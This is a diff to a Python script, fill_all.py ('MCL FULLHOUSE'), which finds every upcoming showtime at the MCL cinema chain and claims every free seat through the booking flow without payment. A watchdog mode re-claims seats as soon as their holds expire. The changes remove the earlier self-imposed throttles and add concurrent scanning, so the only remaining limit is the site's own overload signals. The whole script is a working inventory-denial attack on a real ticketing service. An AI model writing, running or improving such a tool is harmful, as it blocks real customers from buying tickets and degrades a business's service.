@@ -1,37 +1,50 @@
 #!/usr/bin/env python3
 """
-MCL FULLHOUSE — the mcl-filler premise with zero target input:
-discover EVERY showtime of EVERY movie and fill them all.
+MCL FULLHOUSE — API-limited edition.
 
-SAFETY DEFAULT: dry-run. It enumerates the whole programme, probes live seat
-plans (read-only) and prints exactly what it would do. Nothing is claimed or
-held until you pass --live.
+Same premise: discover EVERY showtime of EVERY movie and fill them all.
+Every self-imposed throttle is gone:
+
+* one shared AIMD governor paces discovery, seat-plan scans and booking
+  chains — MCL's own pressure signals ("server busy", 429/5xx, Retry-After)
+  are the only ceiling
+* pipelined concurrent seat-map scanning (no serial watchdog loop)
+* ALL seat chunks per scan processed by bounded consumers (no starvation)
+* visit time-budgets so stalled sessions rotate out; rediscovery fires early
+  when the queue starves instead of on a flat timer
+
+SAFETY DEFAULT: dry-run. Nothing is claimed until --live. Bookings stop at
+the payment page. Wheelchair spaces are never touched.
 
 Usage:
   python3 fill_all.py                       # plan everything (read-only)
   python3 fill_all.py --live                # FILL every upcoming showtime
-  python3 fill_all.py --live --houses 4     # four cinemas filled concurrently
-
-Engine: reuses blaze2's pure-HTTP booking core unchanged (fetch_seat_plan +
-book_chunk). Discovery: see discover.py.
+  python3 fill_all.py --live --houses 4     # four sessions filled concurrently
 """
 
 import argparse
 import asyncio
 import os
 import random
+import sys
 import time
-from collections import Counter, defaultdict
+from collections import Counter
 from datetime import datetime
 
 import httpx
 
 import blaze2
 import discover
-from blaze2 import UA, SEATS_PER, fetch_seat_plan, book_chunk
+from blaze2 import UA, SEATS_PER, WorkerPool, enqueue_chunks, drain_chunks
 from discover import Session, discover_all, filter_upcoming
+from governor import Governor, HostBudget, set_shared_governor, shared_governor
 
 HK_TZ = discover.HK_TZ
+
+VISIT_BUDGET = float(os.environ.get("FULLHOUSE_VISIT_BUDGET", "90"))
+STATS_INTERVAL = float(os.environ.get("FULLHOUSE_STATS_INTERVAL", "5"))
+
+ACTIVE = 0          # sessions currently being filled
 
 
 class Stats:
@@ -55,15 +68,16 @@ class Stats:
 async def probe(sc: httpx.AsyncClient, s: Session) -> int | None:
     """Read-only seat count right now (dry-run helper)."""
     try:
-        seats = await fetch_seat_plan(sc, s.ci, str(s.si))
+        seats = await blaze2.fetch_seat_plan(sc, str(s.ci), str(s.si))
         return len(seats) if seats is not None else None
     except Exception:
         return None
 
 
-async def dry_run(sc: httpx.AsyncClient, sessions: list[Session], limit_probe: int) -> None:
-    print(f"\n🧪 DRY RUN — probing live seat plans for first {limit_probe} sessions "
-          f"(read-only, nothing is claimed)\n")
+async def dry_run(sc: httpx.AsyncClient, sessions: list[Session],
+                  limit_probe: int) -> None:
+    print(f"\n🧪 DRY RUN — probing live seat plans for first {limit_probe} "
+          f"sessions (read-only, nothing is claimed)\n")
     sem = asyncio.Semaphore(6)
 
     async def one(i, s):
@@ -71,8 +85,8 @@ async def dry_run(sc: httpx.AsyncClient, sessions: list[Session], limit_probe: i
             n = await probe(sc, s)
             tag = "?" if n is None else ("FULL" if n == 0 else f"{n} free")
             print(f"  #{i:<4} si={s.si:<8} {s.showdate} {s.start_time or '?':<5} "
-                  f"r~{s.remaining if s.remaining is not None else '?':<3} probe={tag:<5} "
-                  f"{s.cinema[:26]:<26} {s.movie[:36]}")
+                  f"r~{s.remaining if s.remaining is not None else '?':<3} "
+                  f"probe={tag:<5} {s.cinema[:26]:<26} {s.movie[:36]}")
 
     await asyncio.gather(*(one(i, s) for i, s in enumerate(sessions[:limit_probe], 1)))
 
@@ -88,60 +102,110 @@ async def dry_run(sc: httpx.AsyncClient, sessions: list[Session], limit_probe: i
     print("\n▶️  to actually claim these seats:  python3 fill_all.py --live")
 
 
+
 async def fill_one(sc: httpx.AsyncClient, s: Session, stats: Stats,
-                   workers: int, max_rounds: int) -> tuple[str, int]:
-    """Run blaze-style rounds against one session until full / stalled."""
-    stats.visits += 1
+                   workers: int, max_rounds: int, pool: WorkerPool,
+                   wid_base: int = 0) -> tuple[str, int]:
+    """Fill one session until full / stalled / time-budget, event-driven.
+
+    scan -> drain ALL chunks (bounded consumers) -> rescan on demand.
+    No fixed sleeps: waits are governor cooldowns or micro-backoffs."""
+    global ACTIVE
+    ACTIVE += 1
+    gov = shared_governor()
     label = f"{s.movie[:24]} @ {s.cinema[:18]} {s.showdate} {s.start_time or ''}"
+    deadline = time.monotonic() + VISIT_BUDGET
     total, misses, rnd = 0, 0, 0
-    while rnd < max_rounds:
-        rnd += 1
-        try:
-            seats = await fetch_seat_plan(sc, s.ci, str(s.si))
-        except Exception as e:
-            print(f"    [{label}] seatplan error {str(e)[:50]} — retry")
-            await asyncio.sleep(6)
-            continue
-        if seats is None:
-            await asyncio.sleep(10)
-            continue
-        if not seats:
-            stats.full_houses += 1
-            return "full", total
-        chunks = [seats[i:i + SEATS_PER] for i in range(0, len(seats), SEATS_PER)]
-        sem = asyncio.Semaphore(workers)
-        results = {}
-        tasks = [book_chunk(str(s.ci), str(s.si), w, chunks[w], sem, results)
-                 for w in range(min(len(chunks), workers))]
-        got_list = await asyncio.gather(*tasks)
-        got = sum(got_list)
-        total += got
-        stats.booked += got
-        if got:
-            stats.per_movie[s.movie] += got
-            misses = 0
-            print(f"    ✅ si={s.si} {label}: +{got} seats (visit total {total})")
-        else:
-            misses += 1
-            if misses >= 2:
-                break
-            await asyncio.sleep(6)
-    return "stalled" if total == 0 else "partial", total
+    try:
+        while rnd < max_rounds and time.monotonic() < deadline:
+            rnd += 1
+            try:
+                seats = await blaze2.fetch_seat_plan(sc, str(s.ci), str(s.si))
+            except Exception as e:
+                print(f"    [{label}] seatplan error {str(e)[:50]}")
+                await asyncio.sleep(random.uniform(0.5, 1.5))
+                continue
+            if seats is None:
+                # pressure — the governor's cooldown is our wait
+                snap = gov.snapshot()["seatplan"]
+                await asyncio.sleep(max(snap["cooldown"], 0.25))
+                continue
+            if not seats:
+                stats.full_houses += 1
+                return "full", total
+
+            q: asyncio.Queue = asyncio.Queue()
+            inflight: set = set()
+            enqueue_chunks(seats, q, inflight)
+            results: dict = {}
+            got = await drain_chunks(str(s.ci), str(s.si), label[:12], q,
+                                     inflight, pool, asyncio.Semaphore(workers),
+                                     results, stats, deadline,
+                                     n_consumers=workers, wid_base=wid_base)
+            total += got                      # drain_chunks updated stats.booked
+            if got:
+                stats.per_movie[s.movie] += got
+                misses = 0
+                print(f"    ✅ si={s.si} {label}: +{got} seats "
+                      f"(visit total {total})")
+            else:
+                misses += 1
+                if misses >= 2:
+                    return ("stalled" if total == 0 else "partial"), total
+                # contested seats — brief jittered pause, not a fixed 6s
+                await asyncio.sleep(random.uniform(0.25, 1.0))
+        return ("stalled" if total == 0 else "partial"), total
+    finally:
+        ACTIVE -= 1
+
+
+class SeatScanner:
+    """Pipelined concurrent seat-map prober (replaces the serial loop).
+
+    Concurrency is bounded by a local semaphore AND the governor's seatplan
+    budget; priority = sessions that had free seats most recently."""
+
+    def __init__(self, sc: httpx.AsyncClient, probe_width: int = 8):
+        self.sc = sc
+        self.sem = asyncio.Semaphore(max(1, probe_width))
+        self.last_free: dict[int, int] = {}
+
+    def order(self, targets: list[Session]) -> list[Session]:
+        return sorted(targets,
+                      key=lambda t: -self.last_free.get(t.si, 0))
+
+    async def scan(self, targets: list[Session]) -> list[tuple[Session, int]]:
+        frees: list[tuple[Session, int]] = []
+
+        async def one(t: Session):
+            async with self.sem:
+                try:
+                    seats = await blaze2.fetch_seat_plan(self.sc,
+                                                         str(t.ci), str(t.si))
+                except Exception:
+                    return
+                if seats:
+                    frees.append((t, len(seats)))
+                    self.last_free[t.si] = len(seats)
+                elif seats is not None:
+                    self.last_free.pop(t.si, None)
+
+        await asyncio.gather(*(one(t) for t in targets))
+        frees.sort(key=lambda p: -self.last_free.get(p[0].si, p[1]))
+        return frees
 
 
 async def watch_targets(sc: httpx.AsyncClient, args, stats: Stats) -> None:
-    """Watchdog mode (--poll N): rescan the target's seat maps every N seconds;
-    whenever freed seats appear (expired claims), claim them again."""
+    """Watchdog mode (--poll N): concurrent re-scan of every target's seat
+    map each pass; freed seats are claimed immediately, bounded by --houses.
+    Pass interval adapts: shrinks while reclaim-frees keep appearing."""
     targets = await harvest_sessions(args)
     movies = {s.movie for s in targets}
     cinemas = {s.cinema for s in targets}
-    label_bits = []
-    if args.cinema:
-        label_bits.append(f"cinema~{args.cinema}")
-    if args.movie:
-        label_bits.append(f"movie~{args.movie}")
+    bits = [b for b in (f"cinema~{args.cinema}" if args.cinema else None,
+                        f"movie~{args.movie}" if args.movie else None) if b]
     print(f"🎬 watching {len(targets)} sessions ({len(movies)} movies | "
-          f"{len(cinemas)} cinemas){' | ' + ', '.join(label_bits) if label_bits else ''}")
+          f"{len(cinemas)} cinemas){' | ' + ', '.join(bits) if bits else ''}")
     if not targets:
         if args.drain:
             print("🏁 nothing matches these filters right now — done.")
@@ -152,29 +216,44 @@ async def watch_targets(sc: httpx.AsyncClient, args, stats: Stats) -> None:
         await dry_run(sc, targets, min(args.probe, len(targets)))
         return
 
-    print(f"\n⚠️  LIVE WATCH in 5s — every {args.poll:.0f}s the seat maps are re-scanned; "
-          f"\n    freed seats are re-claimed. Ctrl+C to abort.\n")
+    print(f"\n⚠️  LIVE WATCH in 5s — every ~{args.poll:.0f}s the seat maps are "
+          f"re-scanned concurrently;\n    freed seats are re-claimed. Ctrl+C to abort.\n")
     await asyncio.sleep(5)
 
+    gov = shared_governor()
+    scanner = SeatScanner(sc, probe_width=max(4, args.houses * 2))
+    houses_sem = asyncio.Semaphore(max(1, args.houses))
     last_harvest = time.time()
+
+    async def guarded_fill(s: Session):
+        async with houses_sem:
+            try:
+                status, total = await fill_one(sc, s, stats, args.workers,
+                                               args.max_rounds, POOL["pool"],
+                                               wid_base=0)
+                if total:
+                    print(f"  👀 si={s.si} {status} (+{total}) | {stats.line()}")
+            except Exception as e:
+                print(f"  💥 H si={s.si}: {str(e)[:70]}")
+
     while True:
         t_pass = time.time()
+        now_hk = datetime.now(HK_TZ)
         alive = []
         for s in targets:
             dt = s.start_dt()
-            if dt is not None and datetime(dt.year, dt.month, dt.day, dt.hour,
-                                           dt.minute, tzinfo=HK_TZ) < datetime.now(HK_TZ):
-                continue  # screening already started -> drop quietly
+            if dt is not None and datetime(dt.year, dt.month, dt.day,
+                                           dt.hour, dt.minute,
+                                           tzinfo=HK_TZ) < now_hk:
+                continue                       # screening started -> drop
             alive.append(s)
-            try:
-                seats = await fetch_seat_plan(sc, s.ci, str(s.si))
-            except Exception:
-                seats = None
-            if seats:                       # freed / unsold seats exist -> grab them
-                status, total = await fill_one(sc, s, stats, args.workers, args.max_rounds)
-                if total:
-                    print(f"  👀 si={s.si} {status} (+{total}) | {stats.line()}")
         targets = alive
+
+        frees = await scanner.scan(scanner.order(alive))
+        if frees:
+            print(f"  🔎 pass: free seats on {len(frees)} session(s) "
+                  f"({sum(n for _, n in frees)} seats)")
+        await asyncio.gather(*(guarded_fill(s) for s, _ in frees))
 
         if time.time() - last_harvest >= args.refresh * 60:
             try:
@@ -191,17 +270,20 @@ async def watch_targets(sc: httpx.AsyncClient, args, stats: Stats) -> None:
                 print("🏁 drained: nothing left to watch — stopping.")
                 return
 
+        # adaptive interval: shrink while reclaim activity is hot
         waited = time.time() - t_pass
-        await asyncio.sleep(max(0.5, args.poll - waited))
+        poll_eff = max(1.0, args.poll * 0.25) if frees else args.poll
+        await asyncio.sleep(max(0.05, poll_eff - waited))
+
+
+POOL: dict = {"pool": None}       # process-wide WorkerPool, built in supervisor
 
 
 async def harvest_sessions(args) -> list[Session]:
-    """Discover + filter (movie/cinema/shard/order/upcoming). Shared by all modes."""
-    def prog(m):
-        pass  # quiet during orchestration; discovery summary printed separately
+    """Discover + filter (movie/cinema/shard/order/upcoming)."""
     ss = await discover_all(lang=args.lang,
                             limit_movies=args.limit_movies,
-                            concurrency=8, progress=prog)
+                            concurrency=8, progress=lambda m: None)
     if args.movie:
         needle = args.movie.lower()
         ss = [s for s in ss
@@ -226,15 +308,49 @@ async def harvest_sessions(args) -> list[Session]:
     return ss
 
 
+def build_governor(args) -> Governor:
+    """Governor with optional CLI ceiling overrides."""
+    budgets = {
+        "seatplan": HostBudget("seatplan",
+                               getattr(args, "max_conc_seatplan", None)
+                               or int(os.environ.get("FULLHOUSE_MAX_CONC_SEATPLAN", "8")), 2),
+        "www": HostBudget("www",
+                          int(os.environ.get("FULLHOUSE_MAX_CONC_WWW", "8")), 4),
+        "tix": HostBudget("tix",
+                          getattr(args, "max_conc_tix", None)
+                          or int(os.environ.get("FULLHOUSE_MAX_CONC_TIX", "24")), 6),
+    }
+    return Governor(budgets)
+
+
+async def stats_ticker(stats: Stats, queue: asyncio.Queue | None) -> None:
+    gov = shared_governor()
+    while True:
+        await asyncio.sleep(STATS_INTERVAL)
+        q = f"q={queue.qsize()}" if queue is not None else "watch"
+        print(f"  📊 {stats.line()} | active={ACTIVE} {q} | gov={gov.snapshot()}")
+
+
 async def supervisor(args, stats: Stats) -> None:
-    async with httpx.AsyncClient(follow_redirects=True, timeout=httpx.Timeout(12, connect=6)) as sc:
+    set_shared_governor(build_governor(args))
+    gov = shared_governor()
+
+    async with httpx.AsyncClient(follow_redirects=True,
+                                 timeout=httpx.Timeout(12, connect=6)) as sc:
         sc.headers.update({"User-Agent": UA})
 
+        # one process-wide pool for both modes (watchdog + queue)
+        pool = WorkerPool(max(2, args.houses * args.workers))
+        await pool.start()
+        POOL["pool"] = pool
+
         if getattr(args, "poll", None):
-            await watch_targets(sc, args, stats)
+            try:
+                await watch_targets(sc, args, stats)
+            finally:
+                await pool.aclose()
             return
 
-        # optional deterministic sharding: --shard I/N takes every Nth session
         shard = None
         if args.shard:
             try:
@@ -252,96 +368,126 @@ async def supervisor(args, stats: Stats) -> None:
         sessions = await harvest()
         movies = {s.movie for s in sessions}
         cinemas = {s.cinema for s in sessions}
-        label = f" | shard {shard[0]}/{shard[1]}" if shard else ""
+        lbl = f" | shard {shard[0]}/{shard[1]}" if shard else ""
         print(f"🎬 {len(sessions)} upcoming sessions | {len(movies)} movies | "
-              f"{len(cinemas)} cinemas{label}")
+              f"{len(cinemas)} cinemas{lbl}")
 
         if not args.live:
             await dry_run(sc, sessions, args.probe)
             return
 
-        print(f"\n⚠️  LIVE MODE in 5s — claiming real seats at MCL (unpaid, like the original"
-              f"\n    engine: holds expire). Ctrl+C to abort.\n")
+        print(f"\n⚠️  LIVE FILL in 5s — every free seat of every upcoming "
+              f"showtime will be claimed.\n    Ctrl+C to abort.\n")
         await asyncio.sleep(5)
 
-        queue: asyncio.Queue[Session] = asyncio.Queue()
-        active: set[int] = set()
-
-        def enqueue(ss):
-            n = 0
-            for s in ss:
-                if s.si not in active:
-                    active.add(s.si)
-                    queue.put_nowait(s)
-                    n += 1
-            return n
-
-        enqueue(sessions)
-        print(f"🚀 filling with {args.houses} concurrent houses × {args.workers} workers "
-              f"(seats/worker {SEATS_PER})\n")
-
+        queue: asyncio.Queue = asyncio.Queue()
+        for s in sessions:
+            queue.put_nowait(s)
         stop = asyncio.Event()
 
-        async def house(wid: int):
+
+        async def house(wid: int) -> None:
+            wid_base = wid * args.workers
             while not stop.is_set():
                 try:
                     s = queue.get_nowait()
                 except asyncio.QueueEmpty:
-                    await asyncio.sleep(2)
+                    await asyncio.sleep(0.5)
                     continue
-                active.discard(s.si)
                 try:
-                    status, total = await fill_one(sc, s, stats, args.workers, args.max_rounds)
-                    print(f"  🏠 H{wid} si={s.si} {status} (+{total}) | {stats.line()}")
+                    status, total = await fill_one(sc, s, stats, args.workers,
+                                                   args.max_rounds, pool,
+                                                   wid_base=wid_base)
+                    print(f"  🏠 H{wid} si={s.si} {status} (+{total}) "
+                          f"| {stats.line()}")
                 except Exception as e:
                     print(f"  💥 H{wid} si={s.si}: {str(e)[:70]}")
 
-        async def refresher():
+        async def refresher() -> None:
+            """Rediscover when the queue starves (early) or --refresh elapses."""
+            last = time.time()
             while not stop.is_set():
-                await asyncio.sleep(args.refresh * 60)
+                starved = (queue.empty() and ACTIVE == 0)
+                wait = 15.0 if starved else max(1.0, min(60.0,
+                        last + args.refresh * 60 - time.time()))
+                if not starved and time.time() - last < args.refresh * 60:
+                    await asyncio.sleep(min(wait, 15.0))
+                    continue
                 try:
                     fresh = [s for s in await harvest()]
-                    added = enqueue(fresh)
-                    print(f"  ♻️  rediscovered programme: +{added} new/reopened sessions queued")
-                    if args.drain and not fresh and queue.empty():
-                        print("  🏁 drained: no upcoming sessions left for these filters — stopping.")
+                    added = enqueue_fresh(queue, fresh)
+                    print(f"  ♻️  rediscovered programme: +{added} "
+                          f"new/reopened sessions queued")
+                    if args.drain and not fresh and queue.empty() and ACTIVE == 0:
+                        print("  🏁 drained — stopping.")
                         stop.set()
+                        return
                 except Exception as e:
                     print(f"  ⚠️ refresh failed: {str(e)[:70]}")
+                last = time.time()
+
+        def enqueue_fresh(queue: asyncio.Queue, fresh: list[Session]) -> int:
+            inq = {getattr(it, "si", None) for it in list(queue._queue)}  # noqa: SLF001
+            added = 0
+            for s in fresh:
+                if s.si not in inq:
+                    queue.put_nowait(s)
+                    added += 1
+            return added
 
         tasks = [asyncio.create_task(house(w)) for w in range(max(1, args.houses))]
         tasks.append(asyncio.create_task(refresher()))
-        await asyncio.gather(*tasks)
+        tasks.append(asyncio.create_task(stats_ticker(stats, queue)))
+        try:
+            await asyncio.gather(*tasks)
+        finally:
+            stop.set()
+            await pool.aclose()
 
 
 def main():
+    if hasattr(sys.stdout, "reconfigure"):
+        try:
+            sys.stdout.reconfigure(line_buffering=True)
+        except Exception:
+            pass
     p = argparse.ArgumentParser(
-        description="MCL FULLHOUSE — fill every showtime of every movie (dry-run by default)")
+        description="MCL FULLHOUSE — fill every showtime of every movie "
+                    "(dry-run by default)")
     p.add_argument("--lang", type=int, default=2, choices=(1, 2))
     p.add_argument("--live", action="store_true",
                    help="actually claim seats (default is a read-only plan)")
-    p.add_argument("--houses", type=int, default=int(os.environ.get("FULLHOUSE_HOUSES", "3")),
+    p.add_argument("--houses", type=int,
+                   default=int(os.environ.get("FULLHOUSE_HOUSES", "3")),
                    help="sessions filled concurrently (default 3)")
-    p.add_argument("--workers", type=int, default=int(os.environ.get("BLAZE_WORKERS", "8")),
+    p.add_argument("--workers", type=int,
+                   default=int(os.environ.get("BLAZE_WORKERS", "8")),
                    help="parallel booking workers per house (default 8)")
     p.add_argument("--max-rounds", type=int, default=12,
-                   help="seat-plan rounds per visit before rotating (default 12)")
-    p.add_argument("--refresh", type=float, default=15, help="rediscovery period, minutes")
+                   help="seat-map rounds per visit before rotating (default 12)")
+    p.add_argument("--refresh", type=float, default=15,
+                   help="rediscovery period cap, minutes (queue starvation "
+                        "triggers earlier refresh)")
     p.add_argument("--order", choices=("empty", "soonest"), default="empty",
-                   help="empty = most free seats first (default); soonest = chronological")
-    p.add_argument("--limit-movies", type=int, help="cap movies scanned (testing)")
-    p.add_argument("--movie", help="only this movie: case-insensitive name substring or MovieSetId")
-    p.add_argument("--cinema", help="only this location: case-insensitive cinema name substring or cinema code")
+                   help="empty = most free seats first (default); soonest")
+    p.add_argument("--limit-movies", type=int, help="cap scan size (testing)")
+    p.add_argument("--movie", help="only this movie: name substring or MovieSetId")
+    p.add_argument("--cinema", help="only this venue: name substring or code")
     p.add_argument("--poll", type=float, metavar="SECONDS",
-                   help="watchdog mode: re-scan the target's seat maps every N seconds "
-                        "(e.g. --poll 20) and instantly re-claim freed seats; "
-                        "overrides queue/rotate mode")
+                   help="watchdog mode: concurrent re-scan every N seconds; "
+                        "freed seats re-claimed instantly")
     p.add_argument("--drain", action="store_true",
-                   help="exit once no upcoming sessions match the filters instead of running forever")
+                   help="exit once nothing matches the filters anymore")
     p.add_argument("--shard", metavar="I/N",
-                   help="run slice I of N (e.g. 1/3) — split the queue across terminals; "
-                        "each terminal must use a different I")
-    p.add_argument("--probe", type=int, default=25, help="sessions to live-probe in dry-run")
+                   help="run slice I of N (e.g. 1/3)")
+    p.add_argument("--probe", type=int, default=25,
+                   help="sessions to live-probe in dry-run")
+    p.add_argument("--max-conc-tix", type=int,
+                   help="hard ceiling on parallel booking chains "
+                        "(default 24 / $FULLHOUSE_MAX_CONC_TIX)")
+    p.add_argument("--max-conc-seatplan", type=int,
+                   help="hard ceiling on parallel seat-map scans "
+                        "(default 8 / $FULLHOUSE_MAX_CONC_SEATPLAN)")
     args = p.parse_args()
 
     stats = Stats()
@@ -361,3 +507,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
+
+
